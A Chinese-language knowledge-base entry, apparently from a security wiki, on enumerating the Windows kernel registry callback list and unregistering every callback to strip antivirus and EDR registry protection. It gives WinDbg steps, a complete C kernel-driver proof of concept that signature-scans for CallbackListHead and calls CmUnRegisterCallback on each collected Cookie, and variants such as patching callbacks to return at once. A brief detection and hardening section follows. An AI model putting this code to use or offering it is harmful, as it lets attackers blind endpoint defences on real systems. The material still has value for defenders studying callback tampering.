---
id: code-analysis-reverse-windows-cm-callback-list-enum-unregister
title: 枚举 CmpCallback 回调链表取出 Cookie 并 CmUnRegisterCallback 摘除注册表保护
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: windows-registry-callback-list-enumeration
tags:
- windows
- kernel
- registry
- callback
- driver
- anti-protection
- windbg
- edr
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-16
  verified_at: '2026-11-08T07:51:25+08:00'
  notes: 已对照原文与17张截图核对：nt!CallbackListHead 地址 fffff80412248370、特征指令 488d0d02019300 (lea rcx,[nt!CallbackListHead])、Cookie 01ce6288afd295e0、回调入口 MyDriver2!RegistryCallback fffff8042d201080 均与图9/11/13/19一致；节点布局 Flink/Blink/未知/Cookie/Context/fun 与图15/17吻合；图21 枚举出 WdFilter/360Box64/klif/UCPD/fvevol 等真实回调，Cookie 前缀一致。未验证点：原文未展示执行 CmUnRegisterCallback 后保护失效的复测截图（仅给出先收集再卸载的代码），属注销动作未实证；跨版本特征码与结构偏移需重核。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-cm-callback-list-enum-unregister/
draft: false
kb_aliases:
- CmpCallback 链表
- CallbackListHead
- CmUnRegisterCallback 绕过
- 注册表保护绕过
- RegistryCallback 卸载
- CmpCallBackCount
---

## 一句话结论

`CmRegisterCallback` 注册的注册表回调并非不可摘除：在 `CmUnRegisterCallback` 里用 `48 ... 48 8d 0d` 特征定位 `nt!CallbackListHead`，遍历双向链表取出每个节点的 `Cookie`，收集完再逐个 `CmUnRegisterCallback(Cookie)`，即可让安全驱动的注册表监控（启动项拦截、关键键保护）整体失效。

## 原理

- `CmRegisterCallback(Function, Context, &Cookie)` 把回调节点挂到内核全局链表 `nt!CallbackListHead`，卸载时 `CmUnRegisterCallback(Cookie)` 用 Cookie 反查并摘链、释放节点。因此 Cookie 是卸载的唯一凭据，而它就存在链表节点里。
- 节点结构（依据 WinDbg `dq` 逐个核对）为：`LIST_ENTRY`（Flink/Blink）+ 一个未知 qword + `LARGE_INTEGER Cookie` + `Context` + 回调函数指针。Cookie 形如 `01ce6288afd295e0`（高位为时间派生值），与 `DbgPrint` 打出的回调地址同节点对应。
- 链表头地址不导出符号、无法直接引用，但 `CmUnRegisterCallback` 内部会 `lea rX, [nt!CallbackListHead]`，机器码为 `48 8d 0d <disp32>`；在函数前 1000 字节内匹配 `0x48` + 后随 `48 8d 0d`，取 lea 结束地址加 `disp32` 即得链表头。
- 拿到链表头后按 `Flink` 环形遍历，读到 Cookie 后调用 `CmUnRegisterCallback` 即可摘掉第三方保护，因为内核没有"回调只能由注册者卸载"的校验——Cookie 只是一个不透明标识，任何内核代码拿到它都能注销。
- 为什么必须"先收集再卸载"：`CmUnRegisterCallback` 会释放当前节点，遍历若在同一次循环里边读 `Flink` 边卸载，下一步取 `plist->Flink` 读的是已释放内存，会直接蓝屏。
- 三个可行路径：① 取 Cookie 调 `CmUnRegisterCallback`；② 直接把回调函数首字节 patch 成 `ret`；③ 把 `CmpCallBackCount` 置 0（计数在 `CmUnRegisterCallback` 尾部，定位方法同上，原文未给代码）。

## 触发条件

- 已能加载并运行任意内核驱动（测试签名、签名驱动或 BYOVD 入口），或以双机内核调试直接改内存。
- 目标上存在通过 `CmRegisterCallback`/`CmRegisterCallbackEx` 实现注册表保护的安全驱动（杀软、EDR、主机加固）。
- 需要提前用 WinDbg 记录一份基线：`dq` 回调函数地址、`Cookie`，用于确认枚举结果。
- 结构偏移与特征码随 Windows 版本、补丁变化，跨版本必须重新核对。

## 利用步骤

1. 双机调试下先确认现状：
   ```text
   kd> dq Cookie
   ffff f804`2d203010  01ce6288`afd295e0  00000000`00000000
   kd> u MyDriver2!RegistryCallback
   fffff804`2d201080  mov qword ptr [rsp+18h],r8
   ```
   记下 Cookie 与回调入口，后续用来验证枚举是否命中。
2. 反汇编 `CmUnRegisterCallback`，确认 `lea r14,[nt!CallbackListHead (fffff804`12248370)]` 的位置，即特征码要定位的指令。
3. 驱动里 `MmGetSystemRoutineAddress(L"CmUnRegisterCallback")` 取地址，扫描前 1000 字节找 `48 ... 48 8d 0d`，算出 `CallbackListHead`。
4. 环形遍历链表，打印 `fun`/`Cookie`/`Context`，并把非零 Cookie 存入数组。
5. 遍历结束后对数组中每个 Cookie 调 `CmUnRegisterCallback`。
6. 复测被保护的行为（新建启动项、改关键键），确认不再被拦截。

## PoC

```c
typedef struct _CMPCALLBACKLIST {
    LIST_ENTRY callbacklist;   // Flink/Blink
    ULONG64    unknown1;
    LARGE_INTEGER cookies;
    ULONG64    funcontext;
    ULONG64    fun;            // 回调函数地址
} CMPCALLBACKLIST, *PCMPCALLBACKLIST;

VOID KillCmpCallback(VOID) {
    UNICODE_STRING name; PUCHAR p; INT i; LONG off;
    PULONG_PTR head; PLIST_ENTRY e; PCMPCALLBACKLIST n;
    LARGE_INTEGER cookies[128]; INT c = 0;

    RtlInitUnicodeString(&name, L"CmUnRegisterCallback");
    p = (PUCHAR)MmGetSystemRoutineAddress(&name);
    for (i = 0; i < 1000; i++)
        if (p[i] == 0x48 && p[i+5] == 0x48 && p[i+6] == 0x8d && p[i+7] == 0x0d) break;
    if (i == 1000) return;
    off  = *(PLONG)(p + i + 5 + 3);                  // disp32
    head = (PULONG_PTR)(p + i + 5 + 7 + off);        // nt!CallbackListHead

    e = (PLIST_ENTRY)(*head);
    do {
        n = (PCMPCALLBACKLIST)e;
        if (MmIsAddressValid(n) && n->cookies.QuadPart && c < 128)
            cookies[c++] = n->cookies;               // 先收集，不能边遍历边卸载
        e = e->Flink;
    } while (e != (PLIST_ENTRY)(*head));

    for (i = 0; i < c; i++) CmUnRegisterCallback(cookies[i]);
}
```

## 变体与关联

- 变体：不解链而 patch 回调函数头为 `ret`（`\x48\x33\xc0\xc3`），对 `CmRegisterCallbackEx` 注册的回调同样有效。
- 变体：把 `CmpCallBackCount` 清零，让后续回调注册/调度判断异常；原文仅给方向。
- 变体：回调链表本身是情报源——枚举结果可看到 `WdFilter.sys`、`fvevol.sys`、第三方杀软驱动各自的注册表回调，等于直接列出目标机的注册表防护清单。
- 关联：[[defense-hardening-windows-kernel-process-protection-ob-callback]]（注册表/进程保护的防御实现）、[[code-analysis-reverse-windows-ob-callback-list-enum-unregister]]（同法摘除 Ob 句柄回调）、[[code-analysis-reverse-windows-process-notify-callback-analysis]]（进程创建回调枚举）。

## 检测与防御

- 检测：安全驱动应校验自身回调仍在链表内（启动与周期性自检），发现 Cookie 消失即告警；监控非白名单驱动加载、`CmUnRegisterCallback` 的非常规调用者。
- 检测：内核回调相关结构被读写会破坏 PatchGuard 假设，可结合 HVCI、内核代码完整性（KGCI/KDP）与崩溃转储分析。
- 加固：开启驱动签名强制与 HVCI；注册表保护不要只依赖单一回调（叠加 ETW、AMSI、用户态校验与云查杀），避免单点被摘。
- 注意：`MmIsAddressValid` 不能替代引用计数与同步，遍历时链表可能被并发修改，实战中需加锁或短暂挂起；结构偏移与特征码必须按目标版本重新确认。
